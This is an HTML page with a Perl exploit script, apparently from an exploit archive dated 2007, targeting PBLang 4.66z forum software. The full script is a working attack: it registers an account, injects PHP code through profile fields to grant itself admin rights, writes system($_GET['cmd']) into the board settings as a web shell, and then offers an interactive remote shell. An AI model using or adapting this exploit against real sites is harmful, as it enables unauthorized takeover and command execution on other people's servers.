<html><head><title>PBlang 4.66z Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl
# PBlang 4.66z Remote Command Execution Exploit
# this Exploit *register* a user with admin access
# - magic_quotes_gpc = Off
# - Only work on 4.66z
#### Coded &amp; Discovered By Hessam-x / Hessamx-at-Hessamx.net

use IO::Socket;
use LWP::UserAgent;
use HTTP::Cookies;


 $host = $ARGV[0];
 $uname = $ARGV[1];
 $passwd = $ARGV[2];
 $url = &quot;http://&quot;.$host;

 print q(
 ###########################################################
 #      PBLANG 4.66z Remote Command Execution Exploit      #
 #                    www.Hessamx.Net                      #
 ################# (C)oded By Hessam-x #####################

);



 if (@ARGV &lt; 3) {
 print &quot; #  usage : xpl.pl [host&amp;path] [uname] [pass]\n&quot;;
 print &quot; #  e.g : xpl.pl www.milw0rm.com/pblang/ str0ke 123456\n&quot;;
 exit();
 }

   print &quot; [~] User/Password : $uname/$passwd \n&quot;;
   print &quot; [~] Host : $host \n&quot;;

 $evilcode  = &quot; \$userlocation=\&quot;hell\&quot;; \$userjoined=\&quot;1174733561\&quot;; \$userhomepage=\&quot;http://\&quot;;&quot;;
 $evilcode .= &quot; \$useradmin=\&quot;1\&quot;; \$usermod=\&quot;0\&quot;; \$userban=\&quot;0\&quot;; \$userlastvisit=\&quot;1174733561\&quot;;&quot;;
 $evilcode .= &quot; \$userlastpost=\&quot;1174733561\&quot;; \$userprevvisit=\&quot;1174733561\&quot;; \$useranimsmilies=\&quot;\&quot;; \$lastaliaschange=\&quot;1174733549\&quot;; /*&quot;;

 $xpl = LWP::UserAgent-&gt;new() or die;
 $cookie_jar = HTTP::Cookies-&gt;new();

 $xpl-&gt;cookie_jar( $cookie_jar );

   #register
 $reg = $xpl-&gt;post($url.'register.php?reg=2',
 Content =&gt; [
 &quot;user&quot; =&gt; $uname,
 &quot;pass&quot; =&gt; $passwd,
 &quot;pass2&quot; =&gt; $passwd,
 &quot;em&quot; =&gt; 'evil@hell.com',
 &quot;realname&quot; =&gt; 'evilcode',
 &quot;alias&quot; =&gt; $uname,
 &quot;msn&quot; =&gt; 'evilcode',
 &quot;icq&quot; =&gt; 'evilcode',
 &quot;aim&quot; =&gt; 'evilcode',
 &quot;yahoo&quot; =&gt; 'evilcode',
 &quot;qq&quot; =&gt; 'evilcode',
 &quot;web&quot; =&gt; 'http://',
 &quot;loc&quot; =&gt; 'hell',
 &quot;pt&quot; =&gt; 'PBLang',
 &quot;av&quot; =&gt; 'none',
 &quot;webav&quot; =&gt;'',
 &quot;sig&quot; =&gt; 'be Safe',
 &quot;regcode&quot; =&gt; '9999999999',
 &quot;lang&quot; =&gt; 'en',
 &quot;accept&quot; =&gt; '1',
 &quot;Submit&quot; =&gt; 'Submit',
 ],);
   print &quot; [~] registered ... \n&quot;;

$login = $xpl-&gt;post($url.'login.php?id=2',
Content =&gt; [
'user' =&gt; $uname,
'pass' =&gt; $passwd,
'Submit' =&gt; 'submit',
],);
$setcookie = $xpl-&gt;post($url.'setcookie.php?u='.$uname);
 if($cookie_jar-&gt;as_string =~ /$uname/) {
   print &quot; [~] Logined ... \n&quot;;
 } else {
 print &quot; [-] Can not Login In $host !\n&quot;;
 exit();
 }
 $ecode = $xpl-&gt;post($url.'ucp.php?id=2&amp;user='.$uname,
 Content =&gt; [
 &quot;npass&quot; =&gt; $passwd,
 &quot;npass2&quot; =&gt; $passwd,
 &quot;oldpass&quot; =&gt; $passwd,
 &quot;emhide&quot; =&gt; 'hide',
 &quot;user&quot; =&gt; $uname,
 &quot;em&quot; =&gt; 'evil@hell.com',
 &quot;realname&quot; =&gt; 'evilcode',
 &quot;alias&quot; =&gt; $uname,
 &quot;msn&quot; =&gt; 'evilcode',
 &quot;icq&quot; =&gt; 'evilcode',
 &quot;aim&quot; =&gt; 'evilcode\&quot;;'.$evilcode,
 &quot;yah&quot; =&gt; 'evilcode',
 &quot;qq&quot; =&gt; 'evilcode',
 &quot;web&quot; =&gt; 'http://',
 &quot;loc&quot; =&gt; 'hell',
 &quot;pt&quot; =&gt; 'PBLang',
 &quot;av&quot; =&gt; 'none',
 &quot;webav&quot; =&gt;'',
 &quot;sig&quot; =&gt; '',
 &quot;regcode&quot; =&gt; '1174733482',
 &quot;ulang&quot; =&gt; '*/ \$userlang=\&quot;en\&quot;; //',
 &quot;accept&quot; =&gt; '1',
 &quot;Submit2&quot; =&gt; 'Submit',
 ],);
print &quot; [+] change access to admin \n&quot;;
$syscode = &quot;system(\$_GET[\'cmd\']); echo _END_ ; //&quot;;
$cmd  = 'echo 1 ; echo _START_ ; '.$syscode;
 $codesys = $xpl-&gt;post($url.'admin2.php?do=fsettings2',
 Content =&gt; [
&quot;title&quot; =&gt; 'Welcome',
&quot;charsets&quot; =&gt; 'Ciso-8859-15',
&quot;motto&quot; =&gt; 's', &quot;bbgimage&quot; =&gt; '2&quot;; '.$cmd, &quot;boardwidth&quot; =&gt; '100', &quot;boardalign&quot; =&gt; 'center',
&quot;frameset&quot; =&gt; '_self', &quot;maxposts&quot; =&gt; '10', &quot;maxppp&quot; =&gt; '25', &quot;maxrpp&quot; =&gt; '10', &quot;maxlatest&quot; =&gt; '10',
&quot;textareawidth&quot; =&gt; '60', &quot;allowem&quot; =&gt; '1', &quot;notifyadm&quot; =&gt; '1', &quot;notifyadmrepl&quot; =&gt; '1',
&quot;language&quot; =&gt; 'en', &quot;timezone&quot; =&gt; '0', &quot;mr&quot; =&gt; 'Sorry', &quot;banreason&quot; =&gt; 'Access+is+denied',
&quot;defslogan&quot; =&gt; 'PBLang++is+super', &quot;adminemail&quot; =&gt; 'evil@hell.foo',
&quot;emsupp&quot; =&gt; '1', &quot;smtpmail&quot; =&gt; '0', &quot;welcmess&quot; =&gt; '', &quot;allalias&quot; =&gt; '1',&quot;chalias&quot; =&gt; '21',
&quot;av&quot; =&gt; '1',&quot;webav&quot; =&gt; '1', &quot;avmaxwidth&quot; =&gt; '100', &quot;avmaxheight&quot; =&gt; '60', &quot;noatch&quot; =&gt; '1',
&quot;attachtypes&quot; =&gt; 'txt', &quot;maxatchsize&quot; =&gt; '20000',
&quot;minspace&quot; =&gt; '10000000', &quot;bbcode&quot; =&gt; '1', &quot;smilys&quot; =&gt; '1', &quot;allowreg&quot; =&gt; '1', &quot;chckip&quot; =&gt; '1' ,&quot;Submit&quot; =&gt; 'Submit',
 ],);

   while ()
{
     print &quot;\n[Shell]\$ &quot;;
     chomp($exc=&lt;STDIN&gt;);
    &amp;sys($exc);
}
sub sys($exc) {
     if ($exc eq 'exit') { exit() ; }
 $res = $xpl-&gt;get($url.'index.php?cmd='.$exc);
 @result = split(/\n/,$res-&gt;content);
 $runned = 0;
 $on = 0;
 for $res(@result) {
   if ($res =~ /^_END_/) { print &quot;\n&quot;; return 0; }
   if ($on == 0) { print &quot;  $res\n&quot;; }
   if ($res =~ /^_START_/) { $on = 1; $runned = 1; }
 }
   if (!$runned) { print &quot;\n Can not execute command . EXPLOIT FAILED !\n&quot; ; exit(); };

 }

print &quot;\n #################################################### \n&quot;;

# milw0rm.com [2007-03-25]</pre></html>